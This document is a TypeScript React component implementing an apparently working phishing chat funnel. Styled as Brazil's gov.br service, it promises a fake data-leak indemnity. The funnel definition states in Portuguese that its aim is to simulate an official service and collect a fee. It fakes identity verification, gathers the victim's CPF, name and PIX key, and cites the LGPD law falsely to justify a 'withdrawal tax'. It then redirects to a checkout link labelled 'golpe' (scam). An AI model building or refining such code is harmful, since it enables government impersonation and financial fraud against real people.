
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

// Interface for initial parameters passed to the chat flow
export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
  typebotId?: string;
  apiHost?: string;
}

// Interfaces for flow step data types
interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrlTemplate?: string;
  style?: string;
}

interface FlowStepDataVideo {
  title?: string;
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayImage {
    message: string;
    imageGenerationDetails?: {
        functionToCall: string;
        templateName: string;
        inputs: Record<string, string>;
        outputVariable: string;
    };
    fallbackImageUrl: string;
    imageAiHint?: string;
    imageAltText?: string;
}


// Main flow step interface
interface FlowStep {
  type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage';
  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage;
  nextStep?: string;
  nextAction?: 'play_video_then_proceed';
  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
  isTerminal?: boolean;
}

// Interface for chat messages
interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

const funnelDefinition = {
  "funnelName": "GovBR Indenização Scan Funnel",
  "description": "Funil para simular um serviço oficial do gov.br e coletar uma taxa de saque para uma suposta indenização por vazamento de dados.",
  "identity": {
    "visualTheme": "gov.br (usar paleta de cores, fontes e logo oficiais)",
    "botName": "Atendimento Gov.BR"
  },
  "variables": {
    "userName": {
      "description": "Nome completo do usuário.",
      "source": "param_url_nome_ou_coleta_inicial"
    },
    "userCPF": {
      "description": "CPF do usuário.",
      "source": "param_url_cpf_ou_coleta_inicial"
    },
    "userBirthDate": {
      "description": "Data de nascimento do usuário.",
      "source": "param_url_nascimento_ou_coleta_inicial"
    },
    "motherName": {
      "description": "Nome da mãe do usuário.",
      "source": "param_url_mae_ou_coleta_inicial"
    },
    "chavePix": {
      "description": "A chave PIX informada pelo usuário.",
      "value": null
    },
    "indenizacaoValor": {
      "description": "Valor da indenização.",
      "value": "R$ 5.960,50"
    },
    "taxaValor": {
      "description": "Valor da taxa de saque.",
      "value": "R$ 61,90"
    },
    "dataAtual": {
      "description": "A data do dia em que o usuário está no fluxo.",
      "source": "system_current_date_dd_mm_yyyy"
    },
    "generatedReceiptImageUrl": {
      "description": "URL da imagem do comprovante gerado.",
      "value": null
    }
  },
  "initialStep": "step1_video_hook",
  "steps": {
    "step1_video_hook": {
      "type": "videoDisplay" as const,
      "data": {
        "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro, assista ao vídeo abaixo para informações importantes e para iniciarmos seu atendimento. 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextAction": "play_video_then_proceed" as const,
      "nextStep": "step1b_intro_message1"
    },
    "step1b_intro_message1": {
        "type": "displayMessage" as const,
        "data": {
            "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
        },
        "nextStep": "step1c_intro_message2"
    },
    "step1c_intro_message2": {
        "type": "displayMessage" as const,
        "data": {
            "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
        },
        "nextStep": "step2_mother_name_check"
    },
    "step2_mother_name_check": {
      "type": "multipleChoice" as const,
      "data": {
        "message": "Por favor, confirme o nome completo de sua mãe:",
        "options": [
          {"text": "MARIA APARECIDA DA SILVA", "nextStep": "step3_validation_loading"},
          {"text": "ANA BEATRIZ PEREIRA SANTOS", "nextStep": "step3_validation_loading"},
          {"text": "{{motherName}}", "nextStep": "step3_validation_loading"},
          {"text": "RITA DE CÁSSIA OLIVEIRA", "nextStep": "step3_validation_loading"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_validation_loading"}
        ],
        "note": "Independentemente da escolha, o fluxo avança. O objetivo é simular segurança."
      }
    },
    "step3_validation_loading": {
      "type": "loadingScreen" as const,
      "data": {
        "message": "Validando suas respostas e cruzando informações com a base de dados oficial... Por favor, aguarde.",
        "duration_ms": 3500
      },
      "nextStep": "step3b_confirmation_message"
    },
    "step3b_confirmation_message": {
      "type": "displayMessage" as const,
      "data": {
        "title": "✅ Autenticidade Confirmada!",
        "icon": "success_checkmark_gov_style" as const,
        "message": "Seus dados foram validados com sucesso em nosso sistema.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Valor da Indenização Pré-Aprovada": "{{indenizacaoValor}}",
          "Status da Solicitação": "Pré-Aprovado",
          "Data da Consulta": "{{dataAtual}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step4_collect_pix_type"
    },
    "step4_collect_pix_type": {
      "type": "multipleChoice" as const,
      "data": {
        "message": "Excelente, {{userName}}! Para qual tipo de chave PIX você gostaria de direcionar o valor de {{indenizacaoValor}}?",
        "options": [
          {"text": "CPF (Recomendado e mais rápido)", "action": "setChavePixToUserCPF" as const, "nextStep": "step4d_confirm_pix_key"},
          {"text": "Telefone", "nextStep": "step4b_collect_pix_input_telefone"},
          {"text": "E-mail", "nextStep": "step4c_collect_pix_input_email"},
          {"text": "Chave Aleatória", "nextStep": "step4e_collect_pix_input_aleatoria"}
        ]
      },
      "internalActions": {
        "setChavePixToUserCPF": { "type": "setVariable", "variableName": "chavePix", "valueFrom": "userCPF" }
      }
    },
    "step4b_collect_pix_input_telefone": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:",
        "placeholder": "(XX) XXXXX-XXXX",
        "variableToSet": "chavePix",
        "validation": "br_phone" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4c_collect_pix_input_email": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (E-mail):",
        "placeholder": "seuemail@provedor.com",
        "variableToSet": "chavePix",
        "validation": "email" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4e_collect_pix_input_aleatoria": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (Aleatória):",
        "placeholder": "Sua chave aleatória",
        "variableToSet": "chavePix",
        "validation": "alphanumeric_with_hyphens" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4d_confirm_pix_key": {
        "type": "multipleChoice" as const,
        "data": {
            "message": "⚠️ **ATENÇÃO!** Verifique cuidadosamente se a chave PIX está correta antes de prosseguir.\n\nChave PIX informada: **{{chavePix}}**\n\nO Governo Federal não se responsabiliza por transferências para chaves PIX informadas incorretamente.",
            "options": [
                {"text": "Sim, a chave PIX está correta.", "nextStep": "step5_generate_receipt_loading"},
                {"text": "Não, desejo corrigir a chave.", "nextStep": "step4_collect_pix_type"}
            ]
        }
    },
    "step5_generate_receipt_loading": {
      "type": "loadingScreen" as const,
      "data": {
        "message": "Registrando sua chave PIX e gerando seu comprovante oficial de recebimento dos valores... Isso pode levar alguns instantes.",
        "duration_ms": 2000 // Shortened for smoother flow after image removal
      },
      "nextStep": "step5b_display_receipt"
    },
     "step5b_display_receipt": {
      "type": "displayMessage" as const, // Changed from displayImage
      "data": {
        "message": "Parabéns, {{userName}}! Sua chave PIX **{{chavePix}}** está registrada para o recebimento de **{{indenizacaoValor}}**."
        // Removed image related properties
      },
      "nextStep": "step10_pix_registered" // Assuming the next step logic would now point to where pix_registered was or directly to tax reveal
    },
    "step10_pix_registered": { // This step's message might be redundant now or could be merged
        "type": "displayMessage" as const,
        "data": {
          "title": "Chave PIX Cadastrada com Sucesso!",
          "icon": "success_checkmark_gov_style" as const,
          "message": "Sua indenização será processada para a chave: **{{chavePix}}**.",
           "details": {
            "Nome do Titular": "{{userName}}",
            "CPF": "{{userCPF}}",
            "Chave PIX para Recebimento": "{{chavePix}}",
            "Valor da Indenização": "{{indenizacaoValor}}",
            "Status": "Pronto para Liberação"
          },
          "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
        },
        "nextStep": "step6_reveal_tax" // Ensure this flows to tax reveal correctly
    },
    "step6_reveal_tax": { // Was step13 in original request, re-linking from new step10
      "type": "displayMessage" as const,
      "data": {
        "title": "RESUMO PARA LIBERAÇÃO IMEDIATA",
        "icon": "currency_dollar_gov_style" as const,
        "details": {
          "Indenização Total Disponível para Saque": "{{indenizacaoValor}}",
          "Titular da Indenização": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX Registrada para Recebimento": "{{chavePix}}",
          "Data da Solicitação": "{{dataAtual}}",
          "--------------------------------------": "--------------------------------------",
          "Taxa Única Transacional (Imposto de Saque Federal)": "**{{taxaValor}}**"
        },
        "note": "Esta taxa é referente aos custos operacionais e de segurança para a transferência eletrônica via PIX.",
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step7_justify_tax_cta"
    },
    "step7_justify_tax_cta": { // Was step14
      "type": "multipleChoice" as const,
      "data": {
        "message": "Prezado(a) {{userName}},\n\nSeu saldo de **{{indenizacaoValor}}** está pronto para ser transferido para a chave PIX **{{chavePix}}**.\n\nPara liberar o saque IMEDIATAMENTE, é necessário o pagamento da Taxa Única Transacional de **{{taxaValor}}**.\n\nConforme a Lei Geral de Proteção de Dados (LGPD, Lei n.º 13.709/2018), esta taxa não pode ser descontada diretamente do valor da indenização, pois o montante está vinculado e protegido em seu nome. O pagamento da taxa garante a segurança e a correta destinação dos fundos exclusivamente a você.",
        "options": [
          {
            "text": "✅ Sim! Quero pagar a taxa de {{taxaValor}} e receber meus {{indenizacaoValor}} AGORA!",
            "action": "redirectToPayment" as const,
            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}",
            "style": "primary_cta_button_gov_style"
          },
          {
            "text": "Tenho dúvidas sobre a taxa.",
            "nextStep": "step7b_explain_tax_more",
            "style": "secondary_link_button_gov_style"
          }
        ]
      }
    },
    "step7b_explain_tax_more": {
        "type": "multipleChoice" as const,
        "data": {
            "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
            "options": [
                 {
                    "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
                    "action": "redirectToPayment" as const,
                    "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}",
                    "style": "primary_cta_button_gov_style"
                  },
                  {
                    "text": "Não quero pagar a taxa agora.",
                    "nextStep": "step_end_no_payment",
                    "style": "destructive_link_button_gov_style"
                  }
            ]
        }
    },
    "step_end_no_payment": {
        "type": "displayMessage" as const,
        "data": {
            "title": "Solicitação Pendente",
            "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
            "icon": "warning_amber_gov_style" as const
        },
        "isTerminal": true
    }
  }
};

const STORAGE_KEY_MESSAGES = 'simulatedChatMessages';
const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey';
const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables';
const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf';


const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);
  const [flowVariables, setFlowVariables] = useState<Record<string, any>>(() => ({
    indenizacaoValor: funnelDefinition.variables.indenizacaoValor.value,
    taxaValor: funnelDefinition.variables.taxaValor.value,
    dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
    userName: initialParams.nome || funnelDefinition.variables.userName?.value || 'Usuário',
    userCPF: initialParams.cpf || funnelDefinition.variables.userCPF?.value || '---.---.---.--',
    userBirthDate: initialParams.nascimento || funnelDefinition.variables.userBirthDate?.value || '--/--/----',
    motherName: initialParams.mae || funnelDefinition.variables.motherName?.value || 'Nome da Mãe Indisponível',
    chavePix: null,
    generatedReceiptImageUrl: null,
  }));

  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const router = useRouter();

  const [showVideoPlaceholderOverlay, setShowVideoPlaceholderOverlay] = useState(true);
  const videoPlaceholderData = useRef<{title?: string; message?: string; thumbnailText?: string; videoUrl?: string} | null>(null);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);


  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
  const justLoadedSessionRef = useRef(false);
  const appearanceDelayMs = 1000;


  // Effect for session loading and reset based on initialParams.cpf
  useEffect(() => {
    if (typeof window === 'undefined') return;

    const currentCpfFromParams = initialParams.cpf;
    const storedSessionCpf = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);
    let shouldResetChat = false;

    const defaultFlowVars = {
      indenizacaoValor: funnelDefinition.variables.indenizacaoValor.value,
      taxaValor: funnelDefinition.variables.taxaValor.value,
      dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
      userName: initialParams.nome || funnelDefinition.variables.userName?.value || 'Usuário',
      userCPF: initialParams.cpf || funnelDefinition.variables.userCPF?.value || '---.---.---.--',
      userBirthDate: initialParams.nascimento || funnelDefinition.variables.userBirthDate?.value || '--/--/----',
      motherName: initialParams.mae || funnelDefinition.variables.motherName?.value || 'Nome da Mãe Indisponível',
      chavePix: null,
      generatedReceiptImageUrl: null,
    };

    if (currentCpfFromParams && storedSessionCpf === currentCpfFromParams) {
      const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
      const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
      const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);

      setMessages(savedMessages ? JSON.parse(savedMessages) : []);
      
      const stepToSet = (savedStep && funnelDefinition.steps[JSON.parse(savedStep) as keyof typeof funnelDefinition.steps]) 
                         ? JSON.parse(savedStep) 
                         : funnelDefinition.initialStep;
      setCurrentStepKey(stepToSet);
      prevCurrentStepKeyRef.current = stepToSet; 

      const newFlowVariables = { ...defaultFlowVars };
      if (savedFlowVars) {
        const parsedSaved = JSON.parse(savedFlowVars);
        newFlowVariables.chavePix = parsedSaved.chavePix || null;
        newFlowVariables.generatedReceiptImageUrl = parsedSaved.generatedReceiptImageUrl || null;
      }
      setFlowVariables(newFlowVariables);
      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]"); 

    } else {
      shouldResetChat = true;
    }

    if (shouldResetChat) {
      sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
      sessionStorage.removeItem(STORAGE_KEY_STEP);
      sessionStorage.removeItem(STORAGE_KEY_VARIABLES);

      if (currentCpfFromParams) {
        sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, currentCpfFromParams);
      } else {
        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF);
      }

      setMessages([]);
      setCurrentStepKey(funnelDefinition.initialStep);
      setFlowVariables(defaultFlowVars);
      prevCurrentStepKeyRef.current = undefined; 
      justLoadedSessionRef.current = false;
    }
  }, [initialParams.cpf, initialParams.nome]); 

  // Saving effects
  useEffect(() => {
    if (typeof window !== 'undefined' && sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === initialParams.cpf) {
      sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
    }
  }, [messages, initialParams.cpf]);

  useEffect(() => {
    if (typeof window !== 'undefined' && sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === initialParams.cpf) {
      sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
    }
  }, [currentStepKey, initialParams.cpf]);

  useEffect(() => {
    if (typeof window !== 'undefined' && sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === initialParams.cpf) {
      const persistableFlowVariables = {
        chavePix: flowVariables.chavePix,
        generatedReceiptImageUrl: flowVariables.generatedReceiptImageUrl,
      };
      sessionStorage.setItem(STORAGE_KEY_VARIABLES, JSON.stringify(persistableFlowVariables));
    }
  }, [flowVariables.chavePix, flowVariables.generatedReceiptImageUrl, initialParams.cpf]);



  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...initialParams, 
        ...funnelDefinition.variables, 
        ...flowVariables, 
    };

    const finalVars = {
        ...allVars,
        userName: flowVariables.userName || initialParams.nome || funnelDefinition.variables.userName?.value || 'Usuário',
        userCPF: flowVariables.userCPF || initialParams.cpf || funnelDefinition.variables.userCPF?.value ||'---.---.---.--',
        userBirthDate: flowVariables.userBirthDate || initialParams.nascimento || funnelDefinition.variables.userBirthDate?.value ||'--/--/----',
        motherName: flowVariables.motherName || initialParams.mae || funnelDefinition.variables.motherName?.value ||'Nome da Mãe Indisponível',
        chavePix: flowVariables.chavePix || '', 
    };


    for (const key in finalVars) {
      const placeholder = `{{${key}}}`;
      // @ts-ignore
      const valueSource = finalVars[key];
      let valueToInsert = "";

      if (typeof valueSource === 'object' && valueSource !== null && 'value' in valueSource) {
        valueToInsert = String(valueSource.value);
      } else if (valueSource !== undefined && valueSource !== null) {
        valueToInsert = String(valueSource);
      }
      
      if (valueToInsert !== undefined) {
         if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
            // Already formatted
        }
        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
            // Already formatted
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoPlaceholderData.current, isTextInputActive]);


  const handleUserActionAndNavigate = (nextStepKey?: string) => {
    if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
    }
    setCurrentDisplayMessage(null); 
    setCurrentImageDetails(null);   
    setIsLoadingStep(false); 
    setLoadingMessage(null);
    // Do not clear videoPlaceholderData.current here if it's part of an ongoing step,
    // or if the step type changes, the main effect will handle it.

    if (nextStepKey) {
        setCurrentStepKey(nextStepKey);
    }
  };


  // Main effect for processing steps
  useEffect(() => {
    if (typeof window === 'undefined') return; 

    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    const processAsNewStep = isNewStep && !justLoadedSessionRef.current;


    if (isNewStep) {
      const prevStepConf = prevCurrentStepKeyRef.current ? funnelDefinition.steps[prevCurrentStepKeyRef.current as keyof typeof funnelDefinition.steps] : null;
      const currentStepConf = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
      
      // Clear persistent UI elements only if the step type has changed
      // or if it's a genuinely new step (not a session load).
      if (processAsNewStep || (prevStepConf && currentStepConf && prevStepConf.type !== currentStepConf.type)) {
            setIsLoadingStep(false);
            setLoadingMessage(null);
            setCurrentImageDetails(null);
            setCurrentDisplayMessage(null);
            setIsTextInputActive(false);
            setCurrentTextInputConfig(null);
            if (currentStepConf?.type !== 'videoDisplay') {
                videoPlaceholderData.current = null; // Clear video placeholder if not a video step
                setCurrentVideoMessage(null);
            }
      }
    }


    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      if(processAsNewStep) setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
      setIsBotTyping(false);
      return;
    }

    const processStepAfterDelay = async () => {
      const botMessageId = `bot-msg-${Date.now()}`;
      let nextStepTransitionDelayMs = 2500; 

      if (processAsNewStep) {
        switch (stepConfig.type) {
          case 'videoDisplay': {
            const data = stepConfig.data as FlowStepDataVideo;
            videoPlaceholderData.current = { title: data.title, message: data.message, thumbnailText: data.thumbnailText, videoUrl: data.videoUrl };
            setCurrentVideoMessage(formatText(data.title || data.message));
            setShowVideoPlaceholderOverlay(true); 
            setIsBotTyping(false);
            return; // Wait for user interaction via handleVideoThumbnailClick
          }
          case 'multipleChoice': {
            const data = stepConfig.data as FlowStepDataMultipleChoice;
            const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
            setIsBotTyping(false);
            return; 
          }
          case 'loadingScreen': {
            const data = stepConfig.data as FlowStepDataLoading;
            setLoadingMessage(formatText(data.message));
            setIsLoadingStep(true);
            setIsBotTyping(false); 
            autoTransitionTimerRef.current = setTimeout(() => {
              if (prevCurrentStepKeyRef.current === currentStepKey) { 
                setIsLoadingStep(false);
                setLoadingMessage(null);
                if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
              }
            }, data.duration_ms);
            return; 
          }
          case 'displayMessage': {
            const data = stepConfig.data as FlowStepDataDisplayMessage;
            const displayMsgData: Message = {
              id: botMessageId, sender: 'bot',
              displayTitle: formatText(data.title),
              text: data.message ? formatText(data.message) : undefined,
              displayDetails: formatDetailsObject(data.details),
              displayIcon: data.icon,
            };
            setCurrentDisplayMessage(displayMsgData);
            if (data.audioUrl && audioRef.current) {
              audioRef.current.src = data.audioUrl;
              audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
            }
            nextStepTransitionDelayMs = data.details ? 4500 : (data.message ? 2500 : 1200);
            if (stepConfig.isTerminal) nextStepTransitionDelayMs = Infinity;
            break; 
          }
          case 'textInput': {
            const data = stepConfig.data as FlowStepDataTextInput;
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
            setCurrentTextInputConfig(data);
            setIsTextInputActive(true);
            setTextInputValue("");
            setIsBotTyping(false);
            return; 
          }
          case 'displayImage': {
             const data = stepConfig.data as FlowStepDataDisplayImage;
             setMessages(prev => [...prev, { id: `bot-img-intro-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
            if (data.imageGenerationDetails) {
                setLoadingMessage(formatText("Gerando seu comprovante..."));
                setIsLoadingStep(true);
                setIsBotTyping(false);
                autoTransitionTimerRef.current = setTimeout(() => {
                  if (prevCurrentStepKeyRef.current === currentStepKey) {
                    setIsLoadingStep(false);
                    setLoadingMessage(null);
                    setFlowVariables(prevVars => ({...prevVars, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                    setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", message: undefined, aiHint: data.imageAiHint || 'document image'});
                    if (stepConfig.nextStep) {
                        autoTransitionTimerRef.current = setTimeout(() => {
                             if (prevCurrentStepKeyRef.current === currentStepKey) handleUserActionAndNavigate(stepConfig.nextStep as string);
                        }, 4000); 
                    }
                  }
                }, 2000); 
                return; 
            } else {
                setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Imagem Gerada", message: undefined, aiHint: data.imageAiHint || 'document image'});
                nextStepTransitionDelayMs = 4000; 
            }
            break;
          }
          default:
            console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
            setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
            setIsBotTyping(false);
            return; 
        }
      } else if (isNewStep && justLoadedSessionRef.current) {
        // Session was just loaded, UI elements for the current step need to be active
        setIsBotTyping(false); // Ensure bot is not typing
        if (stepConfig.type === 'multipleChoice') {
          // Ensure options are displayed. The last message might already have them.
          // If not, we might need to re-add the message with options, but without duplicating text.
          const lastMessage = messages[messages.length - 1];
          if (!lastMessage || !lastMessage.options) {
            const data = stepConfig.data as FlowStepDataMultipleChoice;
            const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
            setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
          }
        } else if (stepConfig.type === 'textInput') {
          setCurrentTextInputConfig(stepConfig.data as FlowStepDataTextInput);
          setIsTextInputActive(true);
        } else if (stepConfig.type === 'videoDisplay') {
            const data = stepConfig.data as FlowStepDataVideo;
            videoPlaceholderData.current = { title: data.title, message: data.message, thumbnailText: data.thumbnailText, videoUrl: data.videoUrl };
            setCurrentVideoMessage(formatText(data.title || data.message));
            setShowVideoPlaceholderOverlay(true);
        } else if (stepConfig.type === 'displayMessage'){
            const data = stepConfig.data as FlowStepDataDisplayMessage;
             const displayMsgData: Message = {
              id: `bot-session-load-disp-${Date.now()}`, sender: 'bot',
              displayTitle: formatText(data.title),
              text: data.message ? formatText(data.message) : undefined,
              displayDetails: formatDetailsObject(data.details),
              displayIcon: data.icon,
            };
            setCurrentDisplayMessage(displayMsgData);
        }
         // For loadingScreen, displayImage - they are transient or self-handle their display state.
      } else {
        // Not a new step or session just loaded - likely a re-render, do nothing extra.
        setIsBotTyping(false);
      }


      const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                (stepConfig.type === 'displayMessage' || (stepConfig.type === 'displayImage' && !(stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails));

      if (canAutoTransition && nextStepTransitionDelayMs !== Infinity) {
        autoTransitionTimerRef.current = setTimeout(() => {
          if (prevCurrentStepKeyRef.current === currentStepKey) { 
             handleUserActionAndNavigate(stepConfig.nextStep as string);
          }
        }, nextStepTransitionDelayMs);
      }
    };

    setIsBotTyping(true);
    const effectiveAppearanceDelay = (stepConfig?.type === 'loadingScreen') ? 0 : appearanceDelayMs;
    
    setTimeout(processStepAfterDelay, effectiveAppearanceDelay);

    if (justLoadedSessionRef.current) {
        justLoadedSessionRef.current = false;
    }
    prevCurrentStepKeyRef.current = currentStepKey;

    return () => {
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
